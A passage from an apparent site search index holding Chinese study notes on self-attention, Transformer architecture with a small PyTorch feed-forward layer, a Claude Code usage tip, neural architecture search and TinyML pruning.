\u5982\u4f55\u8bad\u7ec3\u6f5c\u7a7a\u95f4","text":"<p>\u8fd9\u4e00\u90e8\u5206\u7684\u8bad\u7ec3\u5e76\u975e\u6211\u4eec\u4e4b\u524d\u7684\u6a21\u578b\u90a3\u79cd\u8bad\u7ec3\u90a3\u6837\u76f4\u89c2\uff0c\u8bad\u7ec3\u6a21\u578b\uff0c\u6211\u4eec\u9996\u5148\u60f3\u5230\u7684\u5c31\u662f\u5f97\u6709\u4e00\u7cfb\u5217\u6b63\u786e\u7684\u8f93\u5165\u8f93\u51fa\u4f5c\u4e3a\u8bad\u7ec3\u6570\u636e\uff0c\u90a3\u4e48\u5728\u8fd9\u91cc\u4ec0\u4e48\u624d\u662f\u6240\u8c13\u6b63\u786e\u7684\u8f93\u5165\u548c\u8f93\u51fa\u5462\uff0c\u6211\u4eec\u91c7\u53d6WordVec\u6a21\u578b\uff0c\u5b9e\u9645\u505a\u6cd5\u6709\u70b9\u50cf\u5b8c\u5f62\u586b\u7a7a\uff0c\u4e0a\u4e0b\u6587\u662f\u8f93\u5165\uff0c\u4e2d\u95f4\u7684\u8bcd\u4f5c\u4e3a\u8f93\u51fa</p> <p>\u200b\u200b</p> <p>\u663e\u7136\u8fd9\u79cd\u505a\u6cd5\u7684\u597d\u5904\u5728\u4e8e\u5176\u4e0d\u9700\u8981\u4eba\u4e3a\u5904\u7406\u5730\u6253\u6807\u7b7e\uff0c\u53ea\u9700\u8981\u7a0b\u5e8f\u81ea\u52a8\u6316\u7a7a\u5c31\u884c\uff0c\u4e5f\u5373\u662f\u53ef\u4ee5\u65e0\u76d1\u7763\u5b66\u4e60</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#13","title":"1.3 \u81ea\u6ce8\u610f\u529b\u673a\u5236","text":"<p>\u5f53\u6211\u4eec\u7684\u8f93\u5165\u662f\u4e00\u4e2a\u5e8f\u5217\u7684\u65f6\u5019\uff0c\u6211\u4eec\u603b\u662f\u5e0c\u671b\u53ef\u4ee5\u5b8c\u6574\u5730\u8003\u8651\u6574\u4e2a\u5e8f\u5217\uff0c\u800c\u4f7f\u7528\u57fa\u7840\u7684MLP\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u7a97\u53e3\u53bb\u56fa\u5b9a\u6a21\u578b\u7684\u53c2\u6570</p> <p>Self attention\u7684\u57fa\u7840\u5728\u4e8e\u8f93\u5165N\u4e2a\u5411\u91cf\uff0c\u8f93\u51faN\u4e2a\u5411\u91cf\uff0cSelf-Attention\u5e76\u975e\u4e00\u4e2a\u5b8c\u6574\u7684\u6a21\u578b\uff0c\u800c\u5f80\u5f80\u662f\u590d\u6742\u6a21\u578b\u7684\u5176\u4e2d\u4e00\u5c42\uff0c\u8868\u793a\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>Tips\uff1a\u867d\u7136\u4e0a\u56fe\u548c\u795e\u7ecf\u7f51\u7edc\u7684\u56fe\u50cf\u5f88\u50cf\uff0c\u4f46\u662f\u5176\u5b9e\u662f\u5f88\u5927\u533a\u522b\uff0c\u8fd9\u91cc\u9762\u7684\u8f93\u5165\u90fd\u662f\u77e9\u9635\uff0c\u6bcf\u4e2a\u77e9\u9635\u53ef\u80fd\u8868\u793a\u72ec\u7acb\u7684\u201c\u8bed\u53e5\u201d\uff1b\u800c\u795e\u7ecf\u7f51\u7edc\u4e2d\u7684\u8f93\u5165\u662f\u67d0\u4e2a\u77e9\u9635\u7684\u5c55\u5f00</p> <p>\u6211\u4eec\u80fd\u591f\u53d1\u73b0\u5176\u6bcf\u4e00\u4e2a\u8f93\u51fa\u90fd\u7efc\u5408\u8003\u8651\u4e86\u6240\u6709\u7684\u8f93\u5165\uff0c\u90a3\u4e48\u5177\u4f53\u662f\u5982\u4f55\u8ba1\u7b97\u7684\u5462\uff0c\u5b9e\u9645\u4e0a\u662f\u628a\\(a_1\\)\u548c\\(a_2,a_3,a_4\\)\uff0c\u5206\u522b\u8ba1\u7b97\u76f8\u5173\u7a0b\u5ea6\uff0c\u7136\u540e\u5f97\u51fa\\(b_1\\)\uff0c\u8ba1\u7b97\u5173\u8054\u5ea6\u671f\u95f4\u6d89\u53ca\u4e24\u4e2a\u9700\u8981\u8bad\u7ec3\u7684\u77e9\u9635\u548c\u4e00\u4e2a\u6fc0\u6d3b\u53c2\u6570\uff0c\u591a\u6570\u662fSoftmax\uff0c\u5982\u4f55\u8ba1\u7b97\u5173\u8054\u5ea6\u5c31\u662f\u6570\u5b66\u95ee\u9898\uff0c\u5df2\u7ecf\u6709\u5c01\u88c5\u597d\u7684\u65b9\u6cd5\u4e86</p> <p>\u8ba1\u7b97\u5173\u8054\u5ea6\u7684\u7ec6\u8282\u95ee\u9898</p> <p>\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u8bcd\u5411\u91cf\u77e9\u9635\uff0c\u9700\u8981\u4e58\u4ee5\u4e09\u4e2a\u6743\u91cd\u77e9\u9635\uff0c\u83b7\u5f97Value\uff0cKey\u548cQuery\uff0c\u5f97\u5230Q\uff0cK\u548cV\u4e4b\u540e\u7684\u64cd\u4f5c\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u57fa\u7840\u7684\u6d41\u7a0b\u5982\u4e0b</p> <ul> <li>\u8f93\u5165\u77e9\u9635\uff0c\u8fd9\u4e2a\u77e9\u9635\u5305\u542b\u4e86\u591a\u4e2a\u8bcd\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u4e58\u4ee5\u4e09\u4e2a\u6743\u91cd\u77e9\u9635\u53d8\u6210Q\uff0cK\u548cV</li> <li>\u5c06Q\u4e58\u4ee5K\u7684\u8f6c\u7f6e\uff08\u4e5f\u53ef\u4ee5K\u4e58\u4ee5Q\u7684\u8f6c\u7f6e\uff0c\u662f\u5bf9\u79f0\u7684\uff0c\u53cd\u6b63\u90fd\u8981\u8bad\u7ec3\u5f97\u5230\u6743\u91cd\uff09\uff0c\u5f97\u5230A\u79f0\u4e4b\u4e3a\u6ce8\u610f\u529b\u5f97\u5206</li> <li>\u7136\u540e\u8981\u5bf9\u4e8eA\u8fdb\u884c\u7f29\u653e\uff0c\u9664\u4ee5\\(\\sqrt{D_{out}}\\)</li> <li>\u6700\u540e\u5c06\u5176\u7ed3\u679c\u505aSoftmax\u518d\u4e0eV\u8ba1\u7b97</li> </ul> <p>\u4ece\u8bed\u4e49\u903b\u8f91\u4e0a\u8868\u793a\uff0cV\u662f\u6211\u4eec\u8bad\u7ec3\u51fa\u6765\u7684\u8bcd\u5178+\u8f93\u5165\u7684\u8bcd\u6c47\uff0c\u83b7\u53d6\u5230\u7684\u8bcd\u8bed\u7684\u539f\u59cb\u542b\u4e49\uff0c\u8fd9\u79cd\u542b\u4e49\u662f\u5ba2\u89c2\u7684\uff0c\u4f46\u662fA\u7684\u4f5c\u7528\u5c31\u662f\u7efc\u5408\u4e86\u8bcd\u8bed\u7684\u4e0a\u4e0b\u6587\uff0c\u7528\u4e0a\u4e0b\u6587\u7684\u8bed\u4e49\u5bf9\u4e8e\u5ba2\u89c2\u8bed\u4e49\u518d\u8fdb\u884c\u4fee\u6b63\uff0c\u83b7\u5f97\u66f4\u52a0\u51c6\u786e\u7684\u8bed\u4e49\u3002\u50cf\u7f29\u653e\u7b49\u7ec6\u8282\u64cd\u4f5c\uff0c\u662f\u51fa\u4e8e\u6982\u7387\u5b66\u4e0a\u7684\u8003\u91cf</p> <p>\u5728\u81ea\u6ce8\u610f\u529b\u673a\u5236\u4e2d\uff0c\u56e0\u4e3a\u672c\u8eab\u5c31\u662f\u81ea\u5df1\u548c\u81ea\u5df1\u8fdb\u884c\u8ba1\u7b97\uff0c\u4e3a\u4e86\u9632\u6b62\u6a21\u578b\u63d0\u524d\u770b\u5230\u5f85\u9884\u6d4b\u7684\u4fe1\u606f\uff0c\u5219\u9700\u8981\u4f7f\u7528mask\u673a\u5236\u5bf9\u4e8e\u77e9\u9635\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u5728\u81ea\u6ce8\u610f\u529b\u673a\u5236\u4e4b\u5916\uff0c\u8fd8\u8bde\u751f\u4e86\u4e00\u7cfb\u5217\u7684\u884d\u751f\u4ea7\u7269\uff0c\u6bd4\u5982\u4ea4\u53c9\u6ce8\u610f\u529b\u673a\u5236\uff0c\u5177\u4f53\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4f46\u662fQ\u7684\u6765\u6e90\u662f\u53e6\u4e00\u7ec4\u8bcd\u6c47\u77e9\u9635</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u6709Value\uff0cKey\u548cQuery\u4e09\u4e2a\u5f20\u91cf\u6765\u63cf\u8ff0\u8fd9\u4e2a\u5143\u7d20\uff0c\u5e76\u4e14\u7528\u4ee5\u8ba1\u7b97\u5173\u8054\u5ea6\uff0c\u4e00\u822c\u7684\u8ba1\u7b97\u6d41\u7a0b\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u5728\u300aOn the Relationship,between Self-attention and Convolutional Layers\u300b\u4e2d\u8bba\u8bc1\u4e86CNN\u548cSelf-Attention\u7684\u5173\u7cfb\uff0c\u8bc1\u660e\u4e86CNN\u53ea\u662f\u7279\u6b8a\u53c2\u6570\u7684Self-Attention\uff0c\u800cRNN\u662f\u8981\u5904\u7406\u548cSelf-Attention\u4e00\u6837\u7684\u4e8b\u60c5\uff0c\u4e5f\u5c31\u662f\u5904\u7406\u591a\u4e2a\u8f93\u5165\u4e4b\u95f4\u7684\u5173\u8054\u6027\uff0c\u800c\u73b0\u9636\u6bb5RNN\u7684\u8868\u73b0\u662f\u4e0d\u5982Self-Attention\u7684</p> <p>Self-Attention\u673a\u5236\u76ee\u524d\u6700\u5927\u7684\u5e94\u7528\u5c31\u662f\u4fc3\u6210\u4e86Transformer\u7684\u8bde\u751f\uff0c\u5728CV\u548cNLP\u9886\u57df\u90fd\u6709\u91cd\u5927\u7684\u7a81\u7834</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#14-transformer","title":"1.4 Transformer\u7684\u7ed3\u6784","text":"<p>\u200b\u200b</p> <p>\u89e3\u7801\u548c\u7f16\u7801\u5728\u524d\u5411\u4f20\u64ad\u7684\u65f6\u5019\u662f\u53ef\u4ee5\u5e76\u884c\u7684</p> <p>\u91cc\u9762\u9664\u4e86\u6ce8\u610f\u529b\u5c42\u4ee5\u5916\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7ed3\u6784\uff0c\u6bd4\u5982FeedForward\u5c42\uff0c\u5176\u5185\u90e8\u7684\u7ed3\u6784\u662f\u4e00\u4e2a\u5c0f\u578b\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u56e0\u4e3a\u591a\u5934\u6ce8\u610f\u529b\u5c42\u672c\u8eab\u662f\u4e00\u4e2a\u7ebf\u6027\u53d8\u5316\u7684\u7ed3\u679c\uff0c\u4e3a\u4e86\u4f7f\u5f97\u6a21\u578b\u8868\u8fbe\u529b\u66f4\u5f3a\uff0c\u9700\u8981\u4e00\u4e2a\u62e5\u6709\u975e\u7ebf\u6027\u53d8\u5316\u7684\u5c42\uff0c\u4e5f\u5373\u8fd9\u91cc\u7684FeedForward</p> <pre><code>class FeedForwardBlock(nn.Module):\n    def __init__(self, input_dim, num_heads, dim_feedforward=2048, dropout=0.1 ):\n        super().__init__()\n        # TODO: Initialize the following. \n        # MLP has the following layers : linear, relu, dropout, linear ; hidden dim of linear is given by dim_feedforward\n        self.mlp = nn.Sequential(\n            nn.Linear(input_dim, dim_feedforward),\n            nn.ReLU(),\n            nn.Dropout(dropout),\n            nn.Linear(dim_feedforward, input_dim)\n        )\n        self.dropout = nn.Dropout(dropout)\n        self.norm = nn.LayerNorm(input_dim)\n\n\n    def forward(self, seq):\n        # TODO: - MLP on the sequence. Add dropout to mlp layer output.\n        # Then add a residual connection to the original input, and finally apply normalization. #############################\n        out = self.norm(seq + self.dropout(self.mlp(seq)))\n        return out\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#15","title":"1.5 \u591a\u5934\u6ce8\u610f\u529b\u673a\u5236","text":"<p>\u200b\u200b</p> <p>\u5728\u83b7\u53d6q, k, v\u4e4b\u540e\uff0c\u518d\u8fdb\u4e00\u6b65\u5904\u7406\uff0c\u83b7\u53d6q1\uff0cq2\uff0ck1\uff0ck2\uff0c\u8fd9\u5c31\u662f\u4e8c\u5934\u6ce8\u610f\u529b\u673a\u5236</p> <p>\u6700\u540e\u83b7\u5f97\u591a\u4e2a\u77e9\u9635\u4e4b\u540e\uff0c\u518d\u4e58\u4ee5\u4e00\u4e2a\u77e9\u9635\uff0c\u53d8\u6210\u4e0e\u5355\u5934\u76f8\u540c\u7684\u8f93\u51fa\u5f62\u72b6</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#2-coding-practice","title":"2. Coding Practice","text":"<ul> <li>TODO</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Self-attention%20And%20Transformer/Self-attention%20And%20Transformer/#3-transformer","title":"3. Transformer \u7684\u5206\u652f","text":"<ul> <li>\u4fa7\u91cddecoder \u4e5f\u5373\u4fa7\u91cd\u751f\u6210\u5185\u5bb9\uff0c\u5f62\u6210\u4e86GPT\u8fd9\u79cd\u5927\u578b\u6a21\u578b</li> <li>\u6d4b\u8bd5encoder \u4e5f\u5373\u4fa7\u91cd\u7406\u89e3\u5185\u5bb9\uff0c\u5f62\u6210\u4e86BERT\u8fd9\u4e2a\u65b9\u5411</li> </ul> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Tools/Claude%20Code/","title":"Claude Code","text":"<p>Claude code\u662f\u73b0\u9636\u6bb5\u6700\u5f3a\u7684AI coding\u5de5\u5177\u4e4b\u4e00\uff0c\u56e0\u4e3a\u5176\u662f\u547d\u4ee4\u884c\u7684\u7248\u672c\uff0c\u4f7f\u7528\u8d77\u6765\u4e0d\u5982Cursor\u4e4b\u7c7b\u7684GUI\u5de5\u5177\u90a3\u4e48\u76f4\u89c2\uff0c\u56e0\u6b64\u8981\u8bb0\u5f55\u4e00\u4e0b\u5b83\u7684\u4f7f\u7528\u65b9\u6848</p> <p>Claude code \u67e5\u627e\u804a\u5929\u8bb0\u5f55\uff0c\u9700\u8981\u4f7f\u7528 <code>/resume</code> \u547d\u4ee4\uff0c\u5176\u4f1a\u5217\u51fa\u6240\u6709\u7684\u5bf9\u8bddhistory</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Neural%20Architecture%20Search/","title":"Neural Architecture Search","text":"<p>NAS\u662f\u6307\u6211\u4eec\u5982\u4f55\u53bb\u8bbe\u8ba1\u4e00\u4e2a\u597d\u7684\u795e\u7ecf\u7f51\u7edc\u67b6\u6784\uff0c\u4f7f\u5176\u5728\u51c6\u786e\u5ea6\u548c\u9ad8\u6548\u65b9\u9762\u4e0a\u6709\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u6743\u8861</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Neural%20Architecture%20Search/#1-conv-block","title":"1. Conv Block","text":"<p>\u6bd4\u5982\u4e0a\u56fe\u662fResNet-50\u7684\u4e00\u4e2ablock\u7684\u5185\u5bb9\uff0c\u5176\u5148\u75281x1\u5377\u79ef\u5c06\u8f93\u5165\u8fdb\u884c\u964d\u7ef4\u5230512\uff0c\u518d\u8fdb\u884c\u6602\u8d35\u76843x3\u5377\u79ef\uff0c\u6700\u540e\u518d\u5347\u7ef4\u51fa\u53bb\uff0c\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u8bbe\u8ba1</p> <p>\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u8fd9\u4e2a\u6a21\u578b\u7684\u8ba1\u7b97\u91cf\u548c\u53c2\u6570\u91cf\uff0c\u6bd4\u76f4\u63a5\u5bf9\u4e8e2048\u7684\u539f\u59cb\u8f93\u5165\u8fdb\u884c3x3\u5377\u79ef\u90fd\u8981\u4f18\u79c0\u5f97\u591a</p> <p>\u5bf9\u4e8e\u5377\u79ef\u64cd\u4f5c\u6709\u4f17\u591a\u4f18\u5316\u7684\u65b9\u6848\uff0c\u6bd4\u5982Group Conv\uff08ResNext\uff09</p> <p></p> <p>\u8fd8\u6709\u5c06depth-wise conv\u548cchannel-wise conv\u5206\u79bb\u7684\u65b9\u6848\uff0c\u6bd4\u5982MobileNet</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Neural%20Architecture%20Search/#2-transformer-block","title":"2. Transformer Block","text":"<p>Transformer block \u4e2d\u7684\u8ba1\u7b97\u6027\u80fd\u74f6\u9888\u4e3b\u8981\u662f\u5728Attention\u64cd\u4f5c\u4e2d\uff0c\u4ee5\u4e0b\u662f\u5bf9Attention\u64cd\u4f5c\u7684\u57fa\u672c\u5206\u6790</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/Neural%20Architecture%20Search/#3-automatic-neural-architecture-design","title":"3. Automatic Neural Architecture Design","text":"<p>\u8fd9\u662f\u4e00\u5f20\u56fe\u4e3a\u6211\u4eec\u5c55\u793a\u4e86\u795e\u7ecf\u7f51\u7edc\u67b6\u6784\u65e9\u671f\u7684\u8bbe\u8ba1\u5386\u53f2\uff0c\u4e00\u90e8\u5206\u662f\u4eba\u4eec\u624b\u5de5\u8bbe\u8ba1\u7684\u7ed3\u6784\uff0c\u53e6\u4e00\u90e8\u5206\u662f\u5229\u7528\u673a\u5668\u5b66\u4e60\uff0c\u81ea\u52a8\u8bbe\u8ba1\u7684\u7f51\u7edc\u7ed3\u6784\uff0c\u8fd9\u79cd\u7ed3\u6784\u5f80\u5f80\u4f1a\u66f4\u52a0\u9ad8\u6548</p> <p>\u4ee5\u4e0b\u662f\u795e\u7ecf\u7f51\u7edc\u641c\u7d22\u4efb\u52a1\u7684\u62bd\u8c61\u6d41\u7a0b</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/","title":"TinyML","text":"<p>\u672c\u7b14\u8bb0\u6765\u81eaMit 6.5940\uff0c\u4e00\u4e2a\u5173\u4e8eTinyML\u7684\u8bfe\u7a0b\uff0c\u4e3b\u8981\u8bb2\u8ff0\u4e86\u5173\u4e8e\u526a\u679d\uff0c\u91cf\u5316\u7b49\u4e00\u7cfb\u5217\u5bf9\u4e8e\u795e\u7ecf\u7f51\u7edc\u8fdb\u884c\u9ad8\u6548\u5904\u7406\u7684\u673a\u5236</p> <p>\u8be5\u8bfe\u7a0b\u4e00\u5171\u5206\u4e3a\u51e0\u4e2a\u90e8\u5206</p> <ul> <li>\u7b2c\u4e00\u90e8\u5206\u4e3aEfficient Inference<ul> <li>Pruning &amp; Sparsity</li> <li>Quantization</li> <li>Neural Architecture Search</li> <li>Knowledge Distillation</li> </ul> </li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/#1-deep-neural-network","title":"1. Deep Neural Network","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u6df1\u5ea6\u7f51\u7edc\u800c\u8a00\uff0c\u540c\u6837\u7684\u53c2\u6570\uff0c\u5bbd\u4e14\u6d45\u7684\u7f51\u7edc\u5bf9\u4e8e\u786c\u4ef6\u66f4\u52a0\u53cb\u597d\uff0c\u56e0\u4e3a\u5176\u66f4\u5bb9\u6613\u63d0\u9ad8\u5e76\u884c\u5ea6\uff1b\u76f8\u5bf9\u7684\uff0c\u7a84\u4e14\u6df1\u7684\u7f51\u7edc\u7684\u6027\u80fd\u66f4\u597d\u3002\u56e0\u6b64\u8fd9\u91cc\u6709\u4e2atrade-off</p> <p>\u5377\u79ef\u9700\u8981\u8003\u8651\u7684\u5185\u5bb9</p> <ul> <li>\u5377\u79ef\u7684dimension\uff0c1d\u5377\u79ef\uff0c2d\u5377\u79ef</li> <li>\u5377\u79ef\u7684Kernel size\uff0ckernel\u7684\u5927\u5c0f</li> <li>\u5377\u79ef\u7684\u5c42\u6570\uff0c\u51b3\u5b9a\u4e86\u6700\u540e\u7684\u8f93\u51fa\u7684feature\u7684\u611f\u53d7\u91ce</li> <li>\u5377\u79ef\u7684\u6b65\u5e45\uff0c\u6269\u5927\u6b65\u5e45\u662f\u4e00\u4e2a\u964d\u91c7\u6837\u7684\u8fc7\u7a0b</li> </ul> <p>\u5728\u4fdd\u6301\u5377\u79ef\u6838size\u4e00\u81f4\u7684\u60c5\u51b5\u4e0b\uff0c\u8f93\u51fa\u7684feature\u7684\u611f\u53d7\u91cereceptive field\u968f\u7740\u6a21\u578b\u7684\u5c42\u6570\u7684\u589e\u52a0\u800c\u6269\u5927</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/#2-pruning-sparsity","title":"2. Pruning &amp; Sparsity","text":"<p>\u526a\u679dPruning\u6280\u672f\u662f\u5728\u53c2\u6570\u5c42\u9762\u5bf9\u4e8e\u6a21\u578b\u8fdb\u884c\u4fee\u6539\uff0c\u6700\u7ec8\u7684\u7ed3\u679c\u662f\u8ba9\u6a21\u578b\u5728\u6027\u80fd\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\u80fd\u591f\u6709\u66f4\u5c0f\u7684\u53c2\u6570</p> <p></p> <p>\u4e0a\u56fe\u4e00\u5b9a\u7a0b\u5ea6\u5c55\u793a\u4e86\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u505aPruning\uff0c\u5bf9\u4e8e\u73b0\u4ee3\u8ba1\u7b97\u786c\u4ef6\u6765\u8bf4\uff0cMemory \u79fb\u52a8\u8fdc\u8fdc\u6bd4\u8ba1\u7b97\u8981\u6602\u8d35</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/#21-what-is-pruning","title":"2.1. What is Pruning","text":"<p>\u526a\u679d\u7684\u8fc7\u7a0b\u662f\u8ba9\u795e\u7ecf\u7f51\u7edc\u53d8\u5f97\u7a00\u758f\u7684\u8fc7\u7a0b\uff0c\u51cf\u5c11\u6a21\u578b\u7684\u53c2\u6570\u91cf\uff0c\u4f7f\u5f97\u8ba1\u7b97\u66f4\u52a0\u9ad8\u6548</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/efficient_AI/TinyML/#22-pruning-rules","title":"2.2. Pruning Rules","text":"<p>\u526a\u679d\u7684\u5e38\u89c4\u6d41\u7a0b\u5206\u4e3a\u4e24\u6b65\uff0c\u4e00\u4e2a\u662f\u5220\u51cf\u6389\u6a21\u578b\u4e2d\u7684\u4e00\u4e9bconnections\uff0c\u968f\u540e\u8fdb\u884c\u7b2c\u4e8c\u6b21\u8bad\u7ec3\uff0c\u4f7f\u5f97\u5176\u6027\u80fd\u6062\u590d\u5230\u539f\u6709\u6c34\u5e73</p> <p>Pruning Granularity</p> <p>\u6211\u4eec\u5982\u4f55\u786e\u5b9a\u526a\u679d\u7684\u7c92\u5ea6\uff0c\u6211\u4eec\u6709\u4e00\u4e9b\u8bbe\u8ba1\u8303\u5f0f</p> <p></p> <ul> <li>Fine-granularity pruning \u8fd9\u4e2a\u8303\u5f0f\u662f\u6700\u7075\u6d3b\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u88c1\u526a\u6389\u4efb\u610f\u4f4d\u7f6e\u7684\u6743\u91cd\uff0c\u56e0\u6b64\u5176\u7406\u8bba\u53ef\u4ee5\u8fbe\u5230\u6700\u9ad8\u7684\u526a\u679d\u7387\uff0c\u4f46\u662f\u8fd9\u6837\u5b50\u7684\u65e0\u89c4\u5219\u6027\u4f1a\u5bfc\u81f4GPU\u7684\u5e76\u884c\u6027\u80fd\u6bd4\u8f83\u7cdf\u7cd5\uff0c\u96be\u4ee5\u53bb\u5e76\u884c\u3002</li> <li>Coarse-grained/Structured \u7c97\u7c92\u5ea6\u7684\u526a\u679d\uff0c\u5bf9\u4e8e\u4e00\u6574\u884c/\u5217\u53bb\u526a\u679d\uff0c\u7136\u540e\u538b\u7f29\u6210\u5bc6\u96c6\u77e9\u9635\uff0c\u5176\u4f18\u7f3a\u70b9\u4e8e\u524d\u8005\u6b63\u597d\u76f8\u53cd</li> </ul> <p>\u4ee5\u4e0a\u662f\u5168\u8fde\u63a5\u5c42\u7684\u526a\u679d\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5bf9\u4e8e\u5377\u79ef\u5c42\u8fdb\u884c\u526a\u679d\uff0c\u76f8\u6bd4\u4e8e\u5168\u8fde\u63a5\u5c42\uff0c\u5377\u79ef\u5c42\u7684\u526a\u679d\u65b9\u6848\u5c31\u66f4\u591a\u4e86</p> <p></p> <p>\u6bd4\u5982\u7b2c\u4e8c\u79cdPattern-based Pruning\uff0c\u5c31\u662f\u5728\u4e3a\u526a\u679d\u7684\u7684\u65f6\u5019\u5f15\u5165\u4e00\u79cd\u89c4\u5f8b\uff0c\u4f7f\u5176\u53ef\u4ee5\u6709\u6548\u52a0\u901f\uff0c\u6bd4\u59822:4 Sparse Matrix\uff08\u8fd9\u662fA100 GPU\u4e2d\u7279\u522b\u4f18\u5316\u8fc7\u7684\u7b97\u6cd5\uff09</p> <p></p> <p>\u518d\u6bd4\u5982Channel Pruning\uff0c\u8fd9\u662f\u76f8\u5f53\u7c97\u7c92\u5ea6\u7684\u526a\u679d\uff0c\u76f8\u5f53\u4e8e\u526a\u6389\u4e86\u4e00\u6574\u4e2a\u901a\u9053\uff0c\u5bf9\u4e8e\u795e\u7ecf\u7f51\u7edc\u800c\u8a00\uff0c\u4f1a\u53d8\u6210\u5982\u4e0b\u8fd9\u6837\u5b50\u3002\u5728\u8fd9\u4e9b\u4f8b\u5b50\u4e2d\uff0c\u5982\u4f55\u786e\u5b9a\u7a00\u758f\u5ea6\u7684\u5927\u5c0f\uff0c\u4e5f\u662f\u4e00\u4e2a\u9700\u8981\u8003\u91cf\u7684\u8303\u56f4\u3002\u968f\u673a\u9009\u62e9\u6bcf\u5c42\u7684\u7a00\u758f\u5ea6\u5e76\u4e0d\u662f\u4e00\u4e2a\u597d\u7684\u9009\u62e9</p> <p></p> <p>Pruning Criterion</p> <p>\u5982\u4f55\u9009\u62e9\u9700\u8981\u526a\u679d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u7684\u6838\u5fc3\u51c6\u5219\u81ea\u7136\u662f\u9009\u62e9\u54ea\u4e9b\u5bf9\u4e8e\u6a21\u578b\u8f93\u51fa\u5f71\u54cd\u6700\u5c0f\u7684\u53c2\u6570\u8fdb\u884c\u526a\u679d</p> <p>\u795e\u7ecf\u7f51\u7edc\u6d41\u7a0b\u672c\u8d28\u8fd8\u662f\u77e9\u9635\u4e58\u6cd5\uff0c\u56e0\u6b64\u53c2\u6570\u7684\u7edd\u5bf9\u503c\u57fa\u672c\u5c31\u80fd\u591f\u4ee3\u8868\u5176\u5bf9\u4e8e\u6574\u4e2a\u6a21\u578b\u7684\u5f71\u54cd\uff0c\u56e0\u6b64\u65b9\u6848\u4e00\u5c31\u662f\u6bd4\u8f83\u7edd\u5bf9\u503c\uff08L1-norm\uff09</p> <p></p> <p>\u5f53\u6211\u4eec\u8981\u505a\u66f4\u52a0\u89c4\u8303\u7684\u526a\u679d\u7684\u65f6\u5019\uff0c\u6bd4\u5982\u5220\u9664\u6574\u884c\uff0c\u53ef\u4ee5\u8003\u8651\u5c31\u662f\u628a\u6574\u884c\u53c2\u6570\u7684\u7edd\u5bf9\u503c\u52a0\u8d77\u6765\uff0c\u548c\u5176\u4ed6\u884c\u8fdb\u884c\u6bd4\u8f83\uff0c\u8fdb\u884c\u526a\u679d</p> 